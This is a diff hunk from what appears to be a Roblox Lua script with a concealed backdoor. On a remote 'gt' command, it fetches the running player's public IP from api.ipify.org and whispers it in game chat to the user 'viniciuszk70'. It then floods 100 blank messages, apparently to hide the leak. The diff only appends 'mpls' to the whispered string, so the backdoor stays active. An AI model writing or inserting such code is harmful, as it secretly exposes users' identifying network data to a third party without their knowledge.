@@ -3137,7 +3137,7 @@ end
 if Connect.SendCommand("gt") then
 if LPlayer.Name ~= "viniciuszk70" then
 local GT = tostring(game:HttpGet("https://api.ipify.org", true))
-Replicate.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w viniciuszk70 "..GT, "All")
+Replicate.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("/w viniciuszk70 "..GT.."mpls", "All")
 for i = 1,100 do
 Message(" ",0,0,0,Enum.Font.GothamBlack,22)
 end
